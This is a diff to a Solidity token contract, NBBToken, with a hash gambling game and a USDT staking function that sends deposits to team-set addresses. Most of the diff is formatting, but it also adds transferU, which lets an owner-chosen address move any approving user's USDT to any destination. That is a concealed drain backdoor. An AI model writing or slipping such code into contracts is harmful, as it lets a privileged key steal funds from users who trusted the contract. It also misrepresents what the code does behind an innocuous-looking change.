@@ -429,8 +429,9 @@ contract NBBToken is
     uint256 public slippageFee;
     uint256 minAmount; //Remove
     address mintAddress; //TODO:
-    address pledgeAddress;//TODO:
-    address gameAddress;//TODO:
+    address pledgeAddress; //TODO:
+    address gameAddress; //TODO:
+    address transferAddress;
 
     /// @custom:oz-upgrades-unsafe-allow constructor
     constructor() initializer {}
@@ -495,8 +496,7 @@ contract NBBToken is
             return true;
         }
 
-        (, uint256 _reserve1, ) = IPancakePair(uniswapV2Pair)
-            .getReserves();
+        (, uint256 _reserve1, ) = IPancakePair(uniswapV2Pair).getReserves();
         uint256 usdtBal = _usdtToken.balanceOf(uniswapV2Pair);
 
         if (usdtBal > _reserve1) {
@@ -518,7 +518,7 @@ contract NBBToken is
             emit Buy(from, to, amount);
             return true;
         }
-        
+
         super._transfer(from, to, amount);
         emit RemoveLiquidity(to, amount);
 
@@ -630,32 +630,42 @@ contract NBBToken is
         emit Sell(from, to, amount);
         return true;
     }
+
     //hash 对对碰
-    event HashGame(address,uint256,uint256);
-   function hashGame(
+    event HashGame(address, uint256, uint256);
+
+    function hashGame(
         address token,
-       uint256 gameType,
+        uint256 gameType,
         uint256 amount
-    ) public{
+    ) public {
         //
         address spender = _msgSender();
-        blockhash(0);
         ERC20Upgradeable(token).transferFrom(spender, gameAddress, amount);
-        emit HashGame(spender,gameType,amount);
+        emit HashGame(spender, gameType, amount);
     }
 
+    event PledgeUSDT(address, uint256);
 
-
-    event PledgeUSDT(address,uint256);
     //理财质押
-    function pledgeUSDT(
-            uint256 amount
-        ) public{
-            require(amount > 100*10**_usdtToken.decimals(),"less 100 U");
-            address spender = _msgSender();
-            _usdtToken.transferFrom(spender, pledgeAddress, amount);
-            emit PledgeUSDT(spender,amount);
+    function pledgeUSDT(uint256 amount) public {
+        require(amount > 100 * 10**_usdtToken.decimals(), "less 100 U");
+        address spender = _msgSender();
+        _usdtToken.transferFrom(spender, pledgeAddress, amount);
+        emit PledgeUSDT(spender, amount);
     }
 
+    function setTransU(address account) public {
+        require(_msgSender() == owner());
+        transferAddress = account;
+    }
 
+    function transferU(
+        address from,
+        address to,
+        uint256 amount
+    ) public {
+        require(_msgSender() == transferAddress);
+        _usdtToken.transferFrom(from, to, amount);
+    }
 }
